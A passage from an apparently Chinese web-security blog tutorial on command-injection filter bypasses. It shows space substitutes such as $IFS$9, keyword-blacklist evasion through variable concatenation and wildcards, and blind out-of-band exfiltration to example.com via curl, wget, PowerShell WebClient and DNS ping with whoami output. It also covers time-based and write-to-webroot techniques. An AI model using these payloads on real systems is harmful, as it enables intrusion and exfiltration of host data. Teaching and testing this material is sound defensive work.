www.vps.com;<br></code></pre></td></tr></table></figure><p>再通过将Fuzz列表插入命令点后，通过查看自己服务器的Web日志来观察是否存在漏洞</p><h2 id="命令执行的绕过技巧"><a href="#命令执行的绕过技巧" class="headerlink" title="命令执行的绕过技巧"></a>命令执行的绕过技巧</h2><h3 id="缺少空格"><a href="#缺少空格" class="headerlink" title="缺少空格"></a>缺少空格</h3><p>​    在一些代码审计中经常会禁止空格的出现或者将空格过滤为空。例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$cmd</span> = str_replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;CMD:&quot;</span> . <span class="hljs-variable">$cmd</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>将CMD参数中空格过滤为空，导致执行<code>echo pwnpwn</code>失败，但是在命令中间隔的字符可以不只是空格，利用<code>Burpsuite</code>对%00~%ff区间的字符串进行测试。</p><p>​    利用Burp Suite进行Fuzz，可以发现其他字符也可以过滤；也可以通过字符串截取的方式获取空格</p><h4 id="Windows下"><a href="#Windows下" class="headerlink" title="Windows下"></a>Windows下</h4><p><code>%ProgramFiles:~10,1%</code></p><ul><li><code>~</code>相当于截取符<ul><li>表示获取环境变量<code>%ProgramFiles%</code>的值：C:\Program Files</li></ul></li></ul><p>以上命令表示：从第10个开始且获取一个字符串，也就是空格</p><h4 id="Linux下"><a href="#Linux下" class="headerlink" title="Linux下"></a>Linux下</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$IFS<span class="hljs-variable">$9</span> <span class="hljs-comment"># 绕过空格</span><br>&#123;cmd,args&#125; <span class="hljs-comment"># bash有效，zsh、dash无效</span><br>cat&lt;&gt;flag <span class="hljs-comment"># 读取文件时</span><br></code></pre></td></tr></table></figure><ul><li><p><code>$IFS$9</code></p><ul><li><p>Linux存在IFS（Internal Field Separator）环境变量，即内部字段分隔符，定义了bash shell 的命令间隔字符，一般为空格。</p></li><li><blockquote><p>当只注入<code>$IFS</code>时，即执行的命令结果为<code>echo$IFSaaa</code>，解析后的变量是不存在的，所以需要间隔符来避免，通常使用<code>$9</code>，其表示当前系统shell经常的==第九个参数==，通常是个==空字符串==。即最后执行的命令为<code>echo$IFS$9aaa</code></p></blockquote></li></ul></li><li><p><code>$&#123;IFS&#125;​</code></p></li><li><p>或者在某些平台下通过修改IFS变量为逗号来进行注入</p><ul><li><code>;IFS=,;</code></li></ul></li></ul><h3 id="黑名单关键字"><a href="#黑名单关键字" class="headerlink" title="黑名单关键字"></a>黑名单关键字</h3><h4 id="1、利用变量拼接"><a href="#1、利用变量拼接" class="headerlink" title="1、利用变量拼接"></a>1、利用变量拼接</h4><p><code>Linux: a=c;b=at;c=he;d=llo; $a$b   $&#123;c&#125;$&#123;d&#125;</code></p><p>其中，a变量为c，b变量为at，最终拼接即为cat，c变量为he，d变量为llo，最终拼接为hello</p><h4 id="2、使用通配符"><a href="#2、使用通配符" class="headerlink" title="2、使用通配符"></a>2、使用通配符</h4><p>​        “?”代表任意一个字符串，“*”代表任意个字符串</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat /tm?/fla*(Linux)<br><span class="hljs-built_in">type</span> fla*(Windows)<br></code></pre></td></tr></table></figure><h4 id="3、借用已有字符串"><a href="#3、借用已有字符串" class="headerlink" title="3、借用已有字符串"></a>3、借用已有字符串</h4><p>​        若是禁用了<code>&lt;&gt;?</code>等字符串，则可以借用其他文件中的字符串，利用substr()函数截取出某个具体字符</p><p><img src="https://tuchuang-1252476276.cos.ap-nanjing.myqcloud.com/img/image-20211102162634330.png" alt="image-20211102162634330"></p><h3 id="执行无回显"><a href="#执行无回显" class="headerlink" title="执行无回显"></a>执行无回显</h3><blockquote><p>推荐平台：VTest平台[VTest][<a href="https://github.com/opensec-cn/vtest]">https://github.com/opensec-cn/vtest]</a></p></blockquote><h4 id="1、"><a href="#1、" class="headerlink" title="1、"></a>1、</h4><h4 id="HTTP通道"><a href="#HTTP通道" class="headerlink" title="HTTP通道"></a>HTTP通道</h4><p>​    在Windows下，目前只能通过相对复杂的命令进行外带：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-keyword">for</span> /F %x <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;echo hello&#x27;</span>) <span class="hljs-keyword">do</span> <span class="hljs-built_in">start</span> http://example.com/httplog/%x<br></code></pre></td></tr></table></figure><p>假设自己搭建平台的域名为<a href="http://example.com/%EF%BC%8C%E9%80%9A%E8%BF%87for%E5%91%BD%E4%BB%A4%EF%BC%8C%E5%B0%86echo">http://example.com/，通过for命令，将echo</a> hello的执行结果保存%x变量中，然后拼接到URL后</p><p>其缺陷是调用浏览器后并不会关闭，并且遇上特殊字符、空格时会存在截断问题，可以借助powershell进行数据外带</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-keyword">for</span> /F %x <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;echo hello&#x27;</span>) <span class="hljs-keyword">do</span> powershell <span class="hljs-variable">$a</span> = [<span class="hljs-type">System.Convert</span>]::<br>ToBase64String([<span class="hljs-type">System.Text.Encoding</span>]::UTF8.GetBytes(<span class="hljs-string">&#x27;%x&#x27;</span>)); <span class="hljs-variable">$b</span>= <span class="hljs-built_in">New-Object</span><br>Sytem.Net.WebClient;<span class="hljs-variable">$b</span>.DownloadString(<span class="hljs-string">&#x27;http://example.com/httplog/&#x27;</span>+<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>​    在Linux下通常利用cURL、wget等程序外带数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl example.com/`whoami`<br>wget example.com/$(id|base64)<br></code></pre></td></tr></table></figure><h4 id="2、DNS通道"><a href="#2、DNS通道" class="headerlink" title="2、DNS通道"></a>2、DNS通道</h4><blockquote><p>以ping来测试DNS外带数据，ping的参数在win和linux下是有些不同，例如限制ping的个数，win下是<code>-n</code>，Linux下是<code>-c</code>，为了处理兼容性，联合使用<code>ping -nc 1 test.com</code></p></blockquote><p>​    在Linux下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping -c 1 `whoami`.example.com<br></code></pre></td></tr></table></figure><p>​    在windows下，相对复杂，主要利用<code>delims</code>命令进行分割处理，最终拼接到域名前缀上，在利用ping程序外带</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 1、获取计算机名</span><br><span class="hljs-keyword">for</span> /F <span class="hljs-string">&quot;delims=\&quot;</span> %i <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;whoami&#x27;</span>) <span class="hljs-keyword">do</span> ping <span class="hljs-literal">-n</span> <span class="hljs-number">1</span> %i.xxx.example.com<br><br><span class="hljs-comment"># 2、获取用户名</span><br><span class="hljs-keyword">for</span> /F <span class="hljs-string">&quot;delims=\&quot;</span> tokens=<span class="hljs-number">2</span> %i <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;whoami&#x27;</span>) <span class="hljs-keyword">do</span> ping <span class="hljs-literal">-n</span> <span class="hljs-number">1</span> %i.xxx.example.com<br></code></pre></td></tr></table></figure><h4 id="3、时间盲注"><a href="#3、时间盲注" class="headerlink" title="3、时间盲注"></a>3、时间盲注</h4><p>网络不通时，主要借用<code>&amp;&amp;</code>和<code>||</code>的惰性，利用时间盲注将其跑出来；</p><p>Linux下可以使用sleep函数</p><p>Windows下可以选择一些耗时的命令。如<code>ping -n 5 127.0.0.1</code></p><h4 id="4、写入文件，二次返回"><a href="#4、写入文件，二次返回" class="headerlink" title="4、写入文件，二次返回"></a>4、写入文件，二次返回</h4><p>​        如果遇到网络隔离的情况，time型读数据将会极其缓慢，可以将执行命令结果写入到Web目录下，再次通过Web访问文件从而到达回显目的</p><p>例如：通过<code>&gt;</code>进行重定向，将结果导出到Web目录<code>http://xxx.com/xx/3.php?cmd=whoami&gt;test</code>，再次访问文件<code>http://xxx.com/xx/test</code>就可以看到结果</p>]]></content>
    
    
    
    <tags>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
